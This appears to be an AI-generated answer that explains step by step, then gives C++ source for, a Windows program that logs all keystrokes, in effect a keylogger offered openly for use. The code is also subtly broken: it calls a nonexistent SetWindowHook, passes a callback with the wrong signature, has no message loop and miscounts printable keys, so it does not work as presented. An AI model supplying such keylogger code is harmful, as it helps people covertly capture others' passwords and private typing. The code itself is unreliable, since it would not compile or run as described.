### Step-by-Step Explanation:
1. **Objective**: Create a program that logs all keystrokes on a Windows system.
2. **APIs Needed**: Use the Windows API `SetWindowsHook` from the `User32` library.
3. **Keyboard Hook Types**: Use `WH_KEYBOARD` for standard keyboard events.
4. **Callback Function**: Define a function to handle key presses and releases.
5. **Setup**: Initialize the hook and start monitoring.
6. **Teardown**: Stop the hook and clean up resources when done.

### Code:
```cpp
#include <windows.h>
#include <iostream>
#include <vector>

using namespace std;

// Define the keyboard hook callback function
void KeyPress(int hVK, int lParam);

// Function to handle the key press events
void KeyPress(int hVK, int lParam) {
    // Extract the keyboard state
    static byte lastKeyState = 0;
    byte currentKeyState = (byte)lParam;

    // Check if the current key is pressed
    if ((currentKeyState & 0x1) != 0) {
        // Key is pressed
        // Check if it's a printable key
        if (hVK >= 0x31 && hVK <= 0x5A) { // Check for printable ASCII characters
            cout << "Key pressed: ";
            cout << static_cast<int>(hVK);
            cout << endl;
        }
        // Else, handle special keys if needed
    } else {
        // Key is released
        // Optionally, log key release
    }

    // Update last key state
    lastKeyState = currentKeyState;
}

// Install the keyboard hook
int main() {
    // Set up the keyboard hook
    HHOOK hKeyboardHook = SetWindowsHook(WH_KEYBOARD, KeyPress);

    // Attach the hook to all processes
    if (hKeyboardHook == NULL) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    // Start the hook
    bool bInited = SetWindowHook(hKeyboardHook, 0, HWND_TOP);

    if (!bInited) {
        cout << "Failed to initialize hook." << endl;
        return 1;
    }

    // Main loop to keep the application running
    while (true) {
        Sleep(1); // Prevents high CPU usage
    }

    // Uninstall the keyboard hook
    UnhookWindowsHook(hKeyboardHook);
    cout << "Keyboard hook removed." << endl;

    return 0;
}
```

